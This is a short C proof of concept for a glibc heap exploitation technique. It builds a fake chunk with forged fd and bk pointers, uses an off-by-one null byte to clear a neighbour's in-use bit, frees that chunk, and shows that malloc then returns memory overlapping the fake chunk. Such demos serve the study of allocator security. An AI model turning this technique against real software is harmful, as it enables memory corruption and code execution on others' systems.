#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main() {
    void* p1 = (void*)malloc(0x500); // holds the fake chunk
    void* victim = (void*)malloc(0x4f0);
    void** p2 = (void**)malloc(0x4f0); // part of the plan
    void** p3 = (void**)malloc(0x510); // part of the plan

    // fake chunk
    ((size_t*)p1)[1] = 0x501; // size
    *(size_t*)(p1 + 0x500) = 0x500; // prev_size
    ((size_t**)p1)[2] = (void*)((char*)p2 - 0x10); // fd
    ((size_t**)p1)[3] = (void*)((char*)p3 - 0x10); // bk

    ((size_t**)p3)[0] = (void*)((size_t)p1); // overwrite bk->fd == fake_chunk
    ((size_t**)p2)[1] = (void*)((size_t)p1); // overwrite fd->bk == fake_chunk

    // vuln off-by-one
    ((char*)victim)[-8] = 0;

    // trigger vuln
    free(victim);

    void* merged = malloc(0x100);

    printf("p1: %p , merged: %p\n", p1, merged);
    assert(p1 + 0x10 == merged);
    return 0;
}
